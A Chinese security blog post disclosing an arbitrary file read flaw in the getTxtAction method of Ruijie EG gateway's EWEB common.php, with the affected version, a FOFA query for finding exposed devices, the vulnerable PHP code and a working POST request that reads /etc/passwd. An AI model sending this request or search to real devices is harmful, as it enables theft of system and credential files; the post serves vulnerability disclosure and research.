---
title: "锐捷-EWEB common.php 文件读取漏洞"
source: https://mrxn.net/jswz/ruijieweb-common-fileread.html
asset_dir: assets/锐捷-eweb-common.php-文件读取漏洞
---

# 锐捷-EWEB common.php 文件读取漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/5/11 08:32
* 1103浏览
* [0评论](#comment)
* 10分钟阅读

深入探索

在线安全工具

Windows安全工具

文本剥离工具


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

锐捷EG易网关是一款综合网关，由锐捷网络完全自主研发。它集成了先进的软硬件体系架构，配备了DPI深入分析引擎、行为分析/管理引擎，可以在保证网络出口高效转发的条件下，提供专业的流控功能、出色的URL过滤以及本地化的日志存储/审计服务。锐捷EG易网关 `common.php` 的 `getTxtAction` 存在任意[文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)漏洞，攻击者可以利用该[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)读取设备上任意文件内容，造成敏感信息泄露。

漏洞修复方案

# 影响版本

<=2022.07.28.01

# fofa语法

> `title="锐捷网络-EWEB网管系统" || app="Ruijie-EG易网关" && body="/login.php?a=version"`

# 漏洞分析

直接看 `ddi/server/common.php` 中的 `getTxtAction` 方法实现

深入探索

安全研究工具

软件

企业安全咨询

```
public function getTxtAction() {
        $file = p('path');
        $status = true;
        if (file_exists($file)) {
            $content = file_get_contents($file); //读取文件中的内容
        } else {
            $status = false;
            return;
        }
        json_echo(array('status'=>$status, 'content'=>$content));
    }
```

直接将无任何过滤和校验 post 获取的 `path` 直接带入 `file_get_contents` 函数中进行文件操作，导致任意[文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)漏洞。

# 漏洞复现

```
POST /ddi/server/common.php?a=getTxt HTTP/1.1
Host: ruijieweb.mrxn.net
Content-Type: application/x-www-form-urlencoded
Cookie: RUIJIEID=xxxxxxxxxxl855hve3xxxxxxxx
X-Requested-With: XMLHttpRequest
Accept-Encoding: gzip

path=/etc/passwd
```

成功读取到 `/etc/passwd` 文件内容

[![锐捷-EWEB common.php 文件读取漏洞](images/img-001-f04e58ad445d.webp)](https://image.mrxn.net/17e6d77061a945608a6bacdc02740443.webp)

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[锐捷-EWEB common.php 文件读取漏洞](https://mrxn.net/jswz/ruijieweb-common-fileread.html)  
文章链接：<https://mrxn.net/jswz/ruijieweb-common-fileread.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

安全运维咨询

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/ruijieweb-common-fileread.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/ruijieweb-common-fileread.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 